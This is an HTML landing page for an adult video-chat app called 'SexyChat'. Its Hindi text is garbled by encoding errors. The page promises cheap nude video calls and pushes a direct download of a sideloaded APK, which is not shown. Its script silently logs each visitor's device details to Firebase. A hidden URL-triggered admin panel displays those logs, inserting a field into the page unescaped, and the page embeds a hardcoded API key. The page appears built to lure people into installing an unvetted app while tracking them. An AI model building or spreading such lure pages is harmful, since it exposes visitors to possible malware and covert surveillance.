<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>SexyChat</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
  
  <style>
    /* RESET & GLOBAL */
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Outfit', sans-serif;
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      overflow-x: hidden;
    }

    /* =========================
       APP VIEW STYLES 
       ========================= */
    #app-view {
      width: 100%;
      display: flex; /* Flex by default, JS will toggle */
      justify-content: center;
    }

    .mobile-container {
      width: 100%;
      max-width: 450px;
      background: #0f0f0f;
      background-image: linear-gradient(180deg, #2a0010 0%, #0a0a0a 40%);
      display: flex;
      flex-direction: column;
      position: relative;
      min-height: 100vh;
      padding-bottom: 90px;
      box-shadow: 0 0 50px rgba(0,0,0,0.5);
    }

    .header { padding: 25px 20px 15px; text-align: center; }
    .header h1 {
      font-size: 36px; font-weight: 800;
      background: linear-gradient(to right, #fff, #ff3366);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      letter-spacing: -0.5px; margin-bottom: 5px;
    }
    .header p { color: rgba(255, 255, 255, 0.6); font-size: 14px; }

    .hero-image { width: 100%; padding: 0 15px; margin-bottom: 25px; }
    .image-wrapper {
      width: 100%; aspect-ratio: 1 / 1; border-radius: 25px;
      overflow: hidden; border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 0 20px 40px rgba(255, 0, 85, 0.15); position: relative;
    }
    .image-wrapper img { width: 100%; height: 100%; object-fit: cover; }

    .live-badge {
      position: absolute; top: 15px; left: 15px;
      background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(5px);
      padding: 6px 12px; border-radius: 20px;
      display: flex; align-items: center; gap: 6px;
      font-size: 12px; font-weight: 600; border: 1px solid rgba(255, 255, 255, 0.2);
    }
    .dot { width: 8px; height: 8px; background: #ff0055; border-radius: 50%; animation: pulse 1.5s infinite; }

    .features-list { padding: 0 20px; display: flex; flex-direction: column; gap: 12px; }
    .feature-row {
      display: flex; align-items: center; background: rgba(255, 255, 255, 0.05);
      padding: 16px; border-radius: 16px; border: 1px solid rgba(255, 255, 255, 0.05);
    }
    .f-icon { font-size: 22px; margin-right: 15px; width: 30px; text-align: center; }
    .f-text { font-size: 16px; font-weight: 500; color: #eaeaea; }

    .bottom-bar {
      position: fixed; bottom: 0; width: 100%; max-width: 450px;
      padding: 15px 20px 25px; background: linear-gradient(to top, #000000 80%, transparent);
      z-index: 100; left: 50%; transform: translateX(-50%);
    }
    .download-btn {
      display: flex; justify-content: center; align-items: center; width: 100%;
      background: #ff0055; color: white; text-decoration: none;
      padding: 18px; border-radius: 100px; font-size: 18px; font-weight: 800;
      box-shadow: 0 5px 25px rgba(255, 0, 85, 0.4); transition: transform 0.2s;
    }
    .download-btn:active { transform: scale(0.96); }

    @keyframes pulse {
      0% { opacity: 1; box-shadow: 0 0 0 0 rgba(255, 0, 85, 0.7); }
      70% { opacity: 0.5; box-shadow: 0 0 0 6px rgba(255, 0, 85, 0); }
      100% { opacity: 1; box-shadow: 0 0 0 0 rgba(255, 0, 85, 0); }
    }

    /* =========================
       ADMIN VIEW STYLES 
       ========================= */
    #admin-view {
      display: none; /* Hidden by default */
      width: 100%;
      max-width: 800px;
      padding: 20px;
    }
    .admin-title { 
      color: #ff0055; margin-bottom: 20px; 
      border-bottom: 1px solid #333; padding-bottom: 10px; font-size: 24px;
    }
    .table-container {
      overflow-x: auto; background: #111; border-radius: 10px;
      padding: 10px; box-shadow: 0 5px 20px rgba(255, 0, 85, 0.1);
    }
    table { width: 100%; border-collapse: collapse; min-width: 600px; }
    th, td { padding: 15px; text-align: left; border-bottom: 1px solid #222; }
    th { color: #ff0055; font-size: 0.85em; text-transform: uppercase; letter-spacing: 1px; }
    td { font-size: 0.9em; color: #ccc; }
    tr:last-child td { border-bottom: none; }
    tr:hover { background: #1a1a1a; }
    #loading { color: #888; font-style: italic; margin-bottom: 10px; }
    .back-btn {
        display: inline-block; margin-bottom: 20px; color: #666; text-decoration: none; font-size: 12px;
    }
    
    /* Config Error Message */
    #config-error {
      display: none;
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.9); z-index: 9999;
      justify-content: center; align-items: center;
      color: #ff3366; font-weight: bold; text-align: center; padding: 20px;
    }

    /* Toggle visibility helper */
    .hidden { display: none !important; }
  </style>
</head>
<body>

  <!-- Config Error Overlay -->
  <div id="config-error">
    <div>
      <h2>SETUP REQUIRED</h2>
      <p>Please edit the index.html file and add your Firebase Config keys.</p>
    </div>
  </div>

  <!-- =========================
       APP VIEW (DEFAULT)
       ========================= -->
  <div id="app-view">
    <div class="mobile-container">
      
      <div class="header">
        <h1>SexyChat</h1>
        <p>#1 Rated Adult Video App</p>
      </div>

      <div class="hero-image">
        <div class="image-wrapper">
          <div class="live-badge"><div class="dot"></div> LIVE NOW</div>
          <img src="./photo_6152430258435591236_x.jpg" alt="Model Preview" onerror="this.src='https://via.placeholder.com/400?text=App+Preview'"/>
        </div>
      </div>

      <div class="features-list">
        <div class="feature-row">
          <div class="f-icon">üîí</div>
          <div class="f-text">‡§™‡•ç‡§∞‡§æ‡§á‡§µ‡•á‡§ü ‡§è‡§°‡§≤‡•ç‡§ü ‡§¨‡§æ‡§§‡§ö‡•Ä‡§§</div>
        </div>
        <div class="feature-row">
          <div class="f-icon">üíé</div>
          <div class="f-text">1 ‡§ò‡§Ç‡§ü‡•á ‡§ï‡•Ä ‡§ï‡•â‡§≤ ‡§∏‡§ø‡§∞‡•ç‡§´ ‚Çπ1 ‡§Æ‡•á‡§Ç</div>
        </div>
        <div class="feature-row">
          <div class="f-icon">üîû</div>
          <div class="f-text">‡§ï‡•á‡§µ‡§≤ 18+ ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä</div>
        </div>
        <div class="feature-row">
          <div class="f-icon">üìπ</div>
          <div class="f-text">‡§®‡•ç‡§Ø‡•Ç‡§° ‡§µ‡•Ä‡§°‡§ø‡§Ø‡•ã ‡§ï‡•â‡§≤</div>
        </div>
      </div>

      <div class="bottom-bar">
        <a href="./SEXYYCHAT.apk" class="download-btn" download>
          <span>Download App</span>
        </a>
      </div>

    </div>
  </div>

  <!-- =========================
       ADMIN VIEW (HIDDEN)
       ========================= -->
  <div id="admin-view">
      <a href="/" class="back-btn">‚Üê Back to App</a>
      <h1 class="admin-title">Admin Panel: Visitor Logs</h1>
      <div id="loading">Connecting to database...</div>
      
      <div class="table-container">
          <table id="dataTable" style="display:none;">
              <thead>
                  <tr>
                      <th>Time</th>
                      <th>Device Info</th>
                      <th>Screen</th>
                      <th>Platform</th>
                  </tr>
              </thead>
              <tbody id="tableBody"></tbody>
          </table>
      </div>
  </div>

  <!-- FIREBASE LOGIC -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
    // Fixed: Added signInWithCustomToken to imports
    import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
    import { getFirestore, collection, addDoc, getDocs, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

    // --------------------------------------------------------
    // --- STEP 1: PASTE YOUR FIREBASE CONFIG BELOW ---
    // Go to Firebase Console -> Project Settings -> General -> Your Apps -> Config
    // --------------------------------------------------------
    
    // Default to environment variable (works in chat) OR empty object
    let firebaseConfig = (typeof __firebase_config !== 'undefined') ? JSON.parse(__firebase_config) : null;

    // IF HOSTING ON YOUR DOMAIN, UNCOMMENT AND FILL THIS:
    
    firebaseConfig = {
      apiKey: "AIzaSyB0aAJ6HXJEYep75HHdtS12bCt8DXrefMQ",
      authDomain: "ananya-97f29.firebaseapp.com",
      projectId: "ananya-97f29",
      storageBucket: "ananya-97f29.firebasestorage.app",
      messagingSenderId: "1082000389831",
      appId: "1:1082000389831:web:f20e9d63fd7ef2ed1b70e2"
    };
    

    // App ID for database path (You can change 'default-app-id' to your project name)
    const appId = (typeof __app_id !== 'undefined') ? __app_id : 'saxychat-app';


    // --------------------------------------------------------
    // --- LOGIC STARTS HERE ---
    // --------------------------------------------------------

    async function init() {
      // 1. Check if Config Exists
      if (!firebaseConfig || !firebaseConfig.apiKey) {
        console.error("Firebase Config Missing!");
        // If we are on your domain and config is missing, show alert
        if (!window.location.host.includes('googleusercontent')) {
           document.getElementById('config-error').style.display = 'flex';
           return;
        }
      }

      const app = initializeApp(firebaseConfig);
      const auth = getAuth(app);
      const db = getFirestore(app);

      // 2. Auth Function (FIXED)
      async function authenticate() {
          try {
            // Priority Check for Custom Token (Important for Canvas/Preview)
            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                await signInWithCustomToken(auth, __initial_auth_token);
            } else {
                await signInAnonymously(auth);
            }
          } catch (e) {
            console.error("Authentication Failed:", e);
          }
      }

      // 3. Check Routing (Admin vs App)
      const url = window.location.href;
      
      if (url.includes('adminvis')) {
          // --- ADMIN MODE ---
          document.getElementById('app-view').classList.add('hidden');
          document.getElementById('app-view').style.display = 'none';
          document.getElementById('admin-view').style.display = 'block';
          
          await loadAdminData(db, auth, authenticate);

      } else {
          // --- VISITOR MODE ---
          await logVisitor(db, auth, authenticate);
      }
    }

    // --- Log Visitor Data ---
    async function logVisitor(db, auth, authenticate) {
        try {
            await authenticate(); // Use the robust auth function
            
            // Safety check: only write if user exists
            if (!auth.currentUser) return;

            const visitorData = {
                timestamp: serverTimestamp(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                url: window.location.href,
                referrer: document.referrer || "Direct"
            };
            
            // Save to: artifacts/{appId}/public/data/site_visitors
            await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'site_visitors'), visitorData);
            console.log("Analytics: Logged");

        } catch (error) {
            console.error("Analytics Error:", error);
        }
    }

    // --- Load Admin Data ---
    async function loadAdminData(db, auth, authenticate) {
        try {
            await authenticate(); // Use the robust auth function
            
            // Safety check: only read if user exists
            if (!auth.currentUser) {
                document.getElementById('loading').innerText = "Auth Error. Refresh page.";
                return;
            }

            const q = collection(db, 'artifacts', appId, 'public', 'data', 'site_visitors');
            const snapshot = await getDocs(q);
            
            const tbody = document.getElementById('tableBody');
            const rows = [];

            snapshot.forEach(doc => {
                rows.push(doc.data());
            });

            // Sort newest first
            rows.sort((a, b) => {
                const timeA = a.timestamp ? a.timestamp.seconds : 0;
                const timeB = b.timestamp ? b.timestamp.seconds : 0;
                return timeB - timeA;
            });

            if (rows.length === 0) {
                document.getElementById('loading').textContent = "No visitors recorded yet.";
                return;
            }

            rows.forEach(data => {
                const tr = document.createElement('tr');
                const date = data.timestamp ? new Date(data.timestamp.seconds * 1000).toLocaleString() : 'Just now';
                let ua = data.userAgent || "Unknown";
                
                if (ua.includes("Android")) ua = "Android";
                else if (ua.includes("iPhone")) ua = "iPhone";
                else if (ua.includes("Windows")) ua = "Windows";
                
                tr.innerHTML = `
                    <td>${date}</td>
                    <td title="${data.userAgent}">${ua}</td>
                    <td>${data.screen}</td>
                    <td>${data.platform}</td>
                `;
                tbody.appendChild(tr);
            });

            document.getElementById('loading').style.display = 'none';
            document.getElementById('dataTable').style.display = 'table';
        } catch (err) {
            console.error("Admin Load Error:", err);
            document.getElementById('loading').innerText = "Error loading data. Check console/config.";
        }
    }

    // Run
    init();

  </script>
</body>
</html>